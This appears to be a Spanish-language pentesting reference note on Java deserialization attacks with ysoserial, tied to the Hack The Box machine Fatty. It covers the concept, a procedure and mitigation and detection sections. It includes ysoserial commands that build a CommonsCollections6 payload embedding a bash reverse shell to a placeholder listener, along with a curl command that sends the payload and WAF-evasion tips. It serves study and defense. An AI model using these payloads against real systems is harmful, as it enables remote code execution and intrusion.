---
topic: Deserialización Java — cadenas de gadgets con ysoserial
tags: [linux, java, deserializacion, ysoserial, commons-collections, fatty]
---

# Deserialización Java — cadenas de gadgets con ysoserial

[🌐 English](java-deserialization-ysoserial.en.md) | **Español**

## Concepto

Java serializa objetos con `ObjectOutputStream` y los reconstruye con `ObjectInputStream`. Si la aplicación lee un objeto de una fuente no confiable, el `readObject` de las clases del classpath se ejecuta durante la reconstrucción. Con una cadena de gadgets (por ejemplo Commons Collections) se encadenan métodos hasta `Runtime.exec`. `ysoserial` genera esos payloads listos para enviar. En Fatty, una función del servidor recibía objetos serializados y permitía ejecutar comandos en el contenedor.

## Cuándo aplica

- El servidor acepta datos binarios que empiezan por `AC ED 00 05` o su base64 `rO0AB`.
- Hay librerías con gadgets en el classpath (Commons Collections, Spring, Groovy, Rome).
- El servicio es RMI, JMS, una API HTTP o un socket propio.
- La versión de Java y de las librerías permite la cadena.

## Procedimiento

1. Localizar el punto que recibe objetos serializados.
2. Identificar las librerías del classpath (errores, `pom.xml`, JARs).
3. Probar `URLDNS` para confirmar que se deserializa (DNS fuera).
4. Elegir una cadena compatible y generar el payload.
5. Enviarlo y comprobar la ejecución (reverse shell o fichero de prueba).

## Comandos

```bash
java -jar ysoserial.jar URLDNS 'http://<DNS-CALLBACK>/' > dns.bin
java -jar ysoserial.jar CommonsCollections6 'bash -c "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"' > payload.bin
base64 -w0 payload.bin
```

```bash
curl -s --data-binary @payload.bin http://<HOST>:<PORT>/<RUTA>
```

```text
AC ED 00 05  ->  cabecera de serialización Java
```

## Variantes

- `CommonsCollections1` a `7` según la versión de la librería.
- `JRMPClient` para conectar con un listener JRMP propio.
- `Spring1`/`Spring2` si hay Spring en el classpath.
- Enviar el payload en base64 si el endpoint espera texto.
- Si hay un WAF, fragmentar o comprimir el objeto.

## Limitaciones

- La cadena debe existir en el classpath y ser compatible con la versión de Java.
- Los filtros de deserialización (`ObjectInputFilter`) bloquean clases.
- El payload puede requerir una cabecera o un contenedor concreto.
- La ejecución es ciega si no hay salida; conviene usar un callback.

## Mitigación

- No deserializar datos de usuarios; usar JSON u otro formato sin lógica.
- Aplicar `ObjectInputFilter` con listas de clases permitidas.
- Actualizar las librerías y retirar gadgets innecesarios del classpath.
- Firmar y cifrar los mensajes internos; limitar quién puede enviarlos.
- Ejecutar los servicios con el mínimo privilegio y en contenedores aislados.

## Detección

- Cuerpos que empiezan por `AC ED 00 05` o `rO0AB`.
- Peticiones con `Content-Type` binario a endpoints que esperan JSON.
- Resolución DNS saliente desde el servidor tras una petición.
- Procesos Java que lanzan `bash`, `sh` o `cmd` de forma inesperada.

## Referencias

- [ysoserial](https://github.com/frohoff/ysoserial)
- [OWASP — Deserialization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)
- [0xdf — Fatty](https://0xdf.gitlab.io/2020/08/08/htb-fatty.html)
- [Ficha Fatty](../../machines/linux/fatty/README.md)
